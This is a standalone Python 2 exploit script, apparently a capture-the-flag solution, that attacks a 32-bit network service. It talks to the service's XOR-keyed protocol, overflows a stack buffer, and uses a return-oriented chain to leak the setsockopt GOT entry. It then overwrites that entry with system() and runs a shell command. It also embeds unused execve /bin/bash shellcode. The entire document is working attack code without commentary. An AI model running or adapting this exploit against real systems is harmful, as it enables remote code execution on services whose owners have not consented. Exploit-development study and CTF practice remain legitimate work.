from socket import *
import sys, struct

SHELLCODE = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
             "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
             "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
             "\x51\x53\x89\xe1\xcd\x80")

COMMAND = 'id\0'

BUFFERSIZE = 4096 * 32 + 0x10

CLEAN0xC = 0x08048F85
JMP_WRITE = 0x080489C0
JMP_READ = 0x08048860
ADDR_SETSOCKOPT = 0x0804B378
JMP_SETSOCKOPT = 0x08048830
DELTA_SETSOCKOPT_SYSTEM = 0x96f50
NREAD = 0x0804952D
NWRITE = 0x080495A0

def read_buf(s):
    raw_size = s.recv(4)
    size = struct.unpack('<L', raw_size)[0]

    data = ''
    while len(data) < size:
        data += s.recv(size - len(data))
    return data

def write_buf(s, data):
    raw_size = struct.pack('<L', len(data))
    s.send(raw_size)
    s.send(data)

def send_encrypt(s, data):
    s.send('E')
    write_buf(s, data)

def cipher(data, key):
    res = []
    for i, c in enumerate(data):
        res.append(chr(ord(c) ^ ord(key[i % len(key)])))
    return ''.join(res)

def readline(s):
    res = ''
    c = None
    while c != '\n':
        c = s.recv(1)
        res += c
    return res

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])

    payload = 'A' * BUFFERSIZE

    payload += struct.pack('<L', NWRITE)
    payload += struct.pack('<L', CLEAN0xC)
    payload += struct.pack('<L', 1)
    payload += struct.pack('<L', ADDR_SETSOCKOPT)
    payload += struct.pack('<L', 4)

    payload += struct.pack('<L', NREAD)
    payload += struct.pack('<L', CLEAN0xC)
    payload += struct.pack('<L', 1)
    payload += struct.pack('<L', ADDR_SETSOCKOPT)
    payload += struct.pack('<L', 4 + len(COMMAND))

    payload += struct.pack('<L', JMP_SETSOCKOPT)
    payload += 'CCCC'
    payload += struct.pack('<L', 4 + ADDR_SETSOCKOPT)

    s = create_connection((ip, port))

    banner = s.recv(2048)
    banner += s.recv(1)

    send_encrypt(s, '\0' * 128)
    data = readline(s)
    key = read_buf(s)

    send_encrypt(s, cipher(payload, key))
    data = readline(s)
    data = read_buf(s)

    s.send('Q')

    addr_setsockopt = struct.unpack('<L', s.recv(4))[0]
    s.send(struct.pack('<L', addr_setsockopt - DELTA_SETSOCKOPT_SYSTEM) + COMMAND)

    data = readline(s)
    print data

    s.close()

if '__main__' == __name__:
    main()

